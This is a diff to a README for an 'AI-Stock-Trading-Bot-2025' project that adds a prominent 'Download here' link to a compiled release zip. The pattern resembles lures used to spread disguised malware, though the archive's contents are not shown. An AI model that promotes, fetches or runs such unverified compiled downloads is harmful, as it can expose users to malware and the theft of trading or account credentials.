@@ -1,6 +1,8 @@
 # AI-Stock-Trading-Bot-2025
 Simple AI-powered Trading Bot
-
+-----
+# Download here:
+# https://github.com/AIandGadgets/AI-Stock-Trading-Bot-2025/releases/download/Compiled/Trading_BOT_plus_source.zip
 
 ## ⚡ Overview
 The **Robinhood AI Trading Bot** is a simple Python script
